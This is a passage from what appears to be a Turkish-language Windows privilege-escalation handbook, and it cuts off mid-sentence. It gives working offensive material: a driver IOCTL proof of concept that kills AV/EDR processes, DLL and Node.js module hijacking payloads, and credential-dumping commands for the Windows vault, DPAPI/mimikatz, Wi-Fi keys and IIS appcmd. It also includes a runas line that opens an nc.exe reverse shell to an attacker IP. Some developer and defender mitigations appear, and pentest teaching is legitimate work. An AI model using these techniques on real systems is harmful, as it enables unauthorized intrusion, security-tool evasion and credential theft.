- Protected Process/Light (PP/PPL) dahil istenilen process’leri sonlandırma; böylece user land üzerinden kernel aracılığıyla AV/EDR kill.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için önlemler
- DACL ile kısıtlanması amaçlanan device object’leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarını yapın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL denetimleri ekleyin.
- IOCTL’leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulama) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli device adlarının (ör. \\ .\\amsdk*) user-mode tarafından açılmasını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un savunmasız driver blocklist’ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi izin/engelleme listelerinizi tutun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasör içinde yazma izinleriniz** varsa, bir process tarafından yüklenen bir DLL’i **ele geçirebilir** ve **ayrıcalıkları yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu denetimin nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümlemesi hijacking'i

Bu, beklenen modülün **eksik** olması durumunda `require("foo")` gibi yalın bir import gerçekleştiren **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü kök dizinine kadar ulaşabilir. Dolayısıyla `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısından ya da otomatik başlatılan ayrıcalıklı bir masaüstü uygulamasından çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ettiğinde
- bir paket üretim derlemelerinden kaldırıldığında, paketlemeye dahil edilmediğinde veya yüklenemediğinde
- güvenlik açığı içeren `require()` ana uygulama kodunda değil, bağımlılık ağacının derinlerinde yer aldığında

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef yürütülebilir dosyaya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı süreç) göre ayarlayın
- `Path` filtresini `node_modules` `contains` olacak şekilde ayarlayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketleri açılmış `.asar` dosyalarında veya uygulama kaynaklarında işe yarayan kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak kod incelemesiyle **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen tam adla bir modül yerleştirin:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyadaki eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **teknik** yaklaşımdır: ayrıcalıklı bir Windows Node/Electron sürecinin çözüme kavuşturacağı herhangi bir **eksik yalın import** bulun.

### Tespit ve güvenlik önlemleri fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kütüphane destekliyorsa isteğe bağlı yoklamaları devre dışı bırakın (örneğin bazı `ws` kurulumlarında `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` yoklaması önlenebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit olarak tanımlanmış diğer bilinen bilgisayarları kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan erişilebilen **kısıtlı servisleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID’yi süreç sahibi, executable path ve onu başlatan service veya scheduled task ile ilişkilendirin. Bir remote-control service, yalnızca kimlik doğrulama ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklara sahip bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary path pasif ipuçlarıdır; kimlik doğrulaması gerektiren bir memory-corruption yolu ise tam olarak o binary’nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir port sistem sürecine ait görünüyorsa, arka uç service’i o sürece atfetmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) komutunun çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Network enumeration için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

İkili dosya `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc`'ye güvenlik duvarı izni verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator hakları vermez. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için `/root/.bash_history` dahil olmak üzere shell geçmişi dosyalarını inceleyin; ayrıcalık yükseltme için yine de daha yüksek ayrıcalıklı geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımı bir [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) içinde saklar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş dosyalarının içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgisi değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, registry'de bulunan bir düz metin bulgusudur. `AutoAdminLogon=1` olduğu hâlde okunabilir bir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve sıradan registry okumaları bu secret'ın var olup olmadığını veya alınabilir olup olmadığını ortaya koymaz. Bir kimlik bilgisi ifşası bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> kaynağından\
Windows Vault, **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk başta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelerin kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir; ancak çalışma şekli bu değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini saklar. Yani, **bir kaynağa** (sunucuya veya web sitesine) **erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulaması**, Credential Manager ve Windows Vault'tan yararlanabilir ve kullanıcıların sürekli kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabilir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Dolayısıyla uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurup varsayılan depolama vault'undan o kaynağa ait kimlik bilgilerini istemelidir**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary dosyasını çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Dikkat: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanılabilir.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumlara izole edilmiştir ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak şifresi çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolalarını anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sunar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi senaryolarında sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan ana anahtarla birlikte bulunan DPAPI anahtarı**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanarak şifresini çözebilirsiniz.

**master password** tarafından korunan **credentials files** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` değerine uygun şekilde **mimikatz module** `dpapi::cred` kullanarak şifreyi çözebilirsiniz.\
(root yetkiniz varsa) `sekurlsa::dpapi` modülüyle **memory** içinden çok sayıda DPAPI **masterkey** **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kolayca saklamanın bir yolu olarak **scripting** ve otomasyon görevlerinde sıklıkla kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılan bir kimlik bilgisi, gelişigüzel bir dosya adına veya `.xml` yoluna sahip olabilir. Bir betik ya da dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` varsayımı yapmak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette geçerli haklara sahip olup olmadığı ayrıca doğrulanmalıdır. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

İçinde bulunduğu dosyadan bir PS kimlik bilgisinin **şifresini çözmek** için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` altında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey'i çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents klasörü altındaki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer, DPAPI/RDCMan parolası değildir; kurtarma işlemi dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, bir kimlik bilgisi adayı olarak değerlendirin: [üretici notlarına](https://www.donkz.nl/) göre profil koruması, profili oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek biçimde yapılandırılabilir. Bu bilgiye güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar bazen parola ve diğer bilgileri yapışkan not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması genellikle notları `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil başka kullanıcı profili depoları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığının kanıtı saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa yalnızca `plum.sqlite` dosyasının bir kopyası, yakın zamanda kaydedilmiş bazı notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla eşleşen `plum.sqlite-wal` dosyasını da saklayın ve mevcutsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrı ayrı doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmek için ayrıca gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
**Yükleyiciler SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Registry (Kimlik Bilgileri)

### Support-tool registry kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama registry anahtarları altında parolayla ilgili değer adlarını tutar. Örneğin, [satıcının registry anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Değer adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisini değerlendirirken yüklü sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için parolanın gerçekten yeniden kullanılıyor olması ve söz konusu hesap için yetki bulunması gerekir. Şifreli verileri ve kurtarılan parolaları rutin numaralandırma çıktısına dahil etmeyin.

### Korunan sayfalara sahip paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini**, çalışma sayfası korumasından veya gizli sütunlardan ayırt edin. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelenmiş olduğunu göstermez. Yalnızca yetkili olduğunuz ve ilgili dosyaları inceleyin; geniş kapsamlı numaralandırma sırasında olası gizli bilgileri yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun, tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda saklanan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dizinini uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belgeler; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kaldırılmış veya eklenmiş kimlik bilgisi dosyası, şifreleme anahtarı ya da ikisini birlikte kullanan bir betik başvurusunu koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, AES anahtarını şifreli dizenin yanı sıra gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeler. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından yetki dahilinde ilgili içeriği gözden geçirirken rutin numaralandırma çıktısına gizli bilgileri yazdırmayın. Bir yama yolu, şifreli bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizininin ACL'lerini kısıtlayın ve gizli bilgileri derleme değişikliklerine göndermekten kaçının.

### Özel yerel yönetici parolası döndürme

Kurum içinde geliştirilmiş bir parola döndürücü, şifrelenmiş yerel yönetici parolasını yerel bir serviste tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklayabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback'e bağlı bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamanın başarılı olması, ilgili kayıtları okuma izninin bulunduğunu kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli verinin yanında erişilebilirse, şifrelemeye güvenmeden önce anahtar türetme yöntemini aynen inceleyin. Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketiyle açığa çıkmış bir tohumdan deterministik olarak AES anahtarı türeten bir yöntem, bu parolayı korumak için uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik üretimine uygun olmadığını belirtir. Kurtarılan herhangi bir 